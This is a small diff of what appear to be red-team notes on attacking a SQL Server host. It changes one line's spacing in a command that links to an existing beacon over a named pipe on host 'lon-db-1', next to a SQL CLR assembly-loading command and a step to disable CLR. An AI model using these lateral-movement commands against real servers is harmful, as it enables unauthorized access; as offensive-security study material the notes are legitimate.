@@ -47,7 +47,7 @@ sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProced
 
 Link to existing beacon
 ```powershell
-link lon-db-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
+ link lon-db-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
 ```
 
 Disable SQL CLR 
